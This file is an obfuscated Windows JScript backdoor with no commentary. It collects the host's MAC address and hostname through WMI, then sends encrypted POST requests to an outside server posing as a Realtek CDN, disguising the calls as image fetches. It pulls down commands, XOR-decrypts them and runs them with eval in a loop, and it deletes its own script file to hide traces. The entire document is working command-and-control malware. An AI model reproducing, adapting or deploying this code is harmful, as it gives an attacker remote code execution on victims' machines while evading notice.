var itymefanict = "";
var syxomcagy = "";
var lmahwilasca = "show_png";
var ribecmodgimz = "WScript.Shell";
var lsisipocity = "fetch";
var ywuveriq = "MSXML2.ServerXMLHTTP";
var rfyfsavuqyca = "";
var midqangikoby = "image";
var tutxulajqa = "?request=page";
var unavabeluxg = "decrypt";
var ujhibhyqlere = "Scripting.FileSystemObject";
var rexbohohnob = "";
var alrytonoph = "%APPDATA%";
var yjjugsytucmu = "action=get_command";
var owdudmefoxy = "encrypt";
var amikejusafd = "encrypt";
var udmadesjatu = "request";
var jdevbavliwvis = "content";
var ymbuhuqpitib = "create_image";
var hsuvhofylxis = "group=ksoc._2905&rt=0&secret=fghedf43dsSFvm03&time=120000&uid=";
var hyfehagdu = "application/x-www-form-urlencoded";
var ekryjwevcule = "";
var ikxovmitand = "string";
var adqurokyl = "winmgmts:root/CIMV2";
var ejihoplyvqys = "string";
var icymfocfurw = "show_ico";
var umasjudeznu = "https://realtek-cdn.com/";
var etvirjazhebf = "&";
var vugibidga = "Unknown";
var tosydfeseln = "cdn";
var mbymynute = "POST";
var ufgelhyjvovi = "pygaqcetidc=";
var cnudvytyrehdu = "encrypt";
var oryfpylor = "request";
var ekxembyqregto = "decrypt";
var krapjirufqyn = "show_jpg";
var atedjackewyk = "User-Agent";
var xgabuscihach = "Content-Type";
var jegozsejqusra = "no";
var aliflyzunam = "no";
var tezduzbylni = "&id=";
var znejcibbispihse = "_";
var dyzmyjhikhisy = "create_logo";
var njunemiby = "/";
var sguculponjekbu = "_";
var hcidsorlihlypb = "get_image";
var yjtuzhowuco = "";
var adunsedec = "images";
var bodirulku = "POST";
var odjaculakp = "z";
var ddoqfobycnyds = "?request=content&id=";

function id() {
    var lrequest = wmi.ExecQuery("select * from Win32_NetworkAdapterConfiguration where ipenabled = true");
    var lItems = new Enumerator(lrequest);
    for (; !lItems.atEnd(); lItems.moveNext()) {
        var mac = lItems.item().macaddress;
        var dns_hostname = lItems.item().DNSHostName;
        if (typeof mac === ikxovmitand && mac.length > 1) {
            if (typeof dns_hostname !== ikxovmitand && dns_hostname.length < 1) {
                dns_hostname = vugibidga;
            } else {
                for (var i = 0; i < dns_hostname.length; i++) {
                    if (dns_hostname.charAt(i) > odjaculakp) {
                        dns_hostname = dns_hostname.substr(0, i) + sguculponjekbu + dns_hostname.substr(i + 1);
                    }
                }
            }
            return mac + sguculponjekbu + dns_hostname;
        }
    }
}

function crypt_controller(type, request) {
    var encryption_key = itymefanict;
    if (type === ekxembyqregto) {
        request = unescape(request);
        var request_split = request.split(")*(");
        request = request_split[0];
        encryption_key = request_split[1].split(itymefanict);
    } else {
        encryption_key = (Math.floor(Math.random() * 9000) + 1000).toString().split(itymefanict);
        request = unescape(encodeURIComponent(request));
    }
    var output = new Array(request.length);
    for (var i = 0; i < request.length; i++) {
        var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0);
        output[i] = String.fromCharCode(charCode);
    }
    var result_string = output.join(itymefanict);
    if (type === owdudmefoxy) {
        result_string = result_string + ")*(" + encryption_key.join(itymefanict);
        result_string = escape(result_string);
    }
    return result_string;
}

function get_path() {
    var pathes = [adunsedec, midqangikoby, jdevbavliwvis, lsisipocity, tosydfeseln];
    var files = [dyzmyjhikhisy, hcidsorlihlypb, ymbuhuqpitib, icymfocfurw, lmahwilasca, krapjirufqyn];
    var path = pathes[Math.floor(Math.random() * pathes.length)] + njunemiby + files[Math.floor(Math.random() * files.length)];
    return umasjudeznu + path;
}

function send_data(type, data, crypt) {
    try {
        var http_object = new ActiveXObject(ywuveriq);
        if (type === oryfpylor) {
            http_object.open(mbymynute, get_path() + tutxulajqa, false);
            data = ufgelhyjvovi + crypt_controller(owdudmefoxy, hsuvhofylxis + uniq_id + tezduzbylni + id() + etvirjazhebf + data);
        } else {
            http_object.open(mbymynute, get_path() + ddoqfobycnyds + uniq_id, false);
            if (crypt) {
                data = crypt_controller(owdudmefoxy, data);
            }
        }
        http_object.setRequestHeader(atedjackewyk, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/50.0");
        http_object.setRequestHeader(xgabuscihach, hyfehagdu);
        http_object.setOption(2, 13056);
        http_object.send(data);
        return http_object.responseText;
    } catch (e) {
        return jegozsejqusra;
    }
}

function main() {
    var ncommand = itymefanict;
    ncommand = send_data(oryfpylor, yjjugsytucmu, true);
    if (ncommand !== jegozsejqusra) {
        try {
            eval(crypt_controller(ekxembyqregto, ncommand));
        } catch (e) {}
    }
    var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);
    // WScript.Sleep(random_knock);
    main();
}
var first = false;
var shell = new ActiveXObject(ribecmodgimz);
var fso = new ActiveXObject(ujhibhyqlere);
var wmi = GetObject(adqurokyl);
var uniq_id = new Date().getUTCMilliseconds();
var app_path = shell.expandEnvironmentStrings(alrytonoph);
if (fso.GetFolder(app_path).Type.length > 5) {
    fso.deleteFile(WScript.ScriptFullName);
    try {
        // WScript.Sleep(120000);
        main();
    } catch (e) {
        main();
    }
}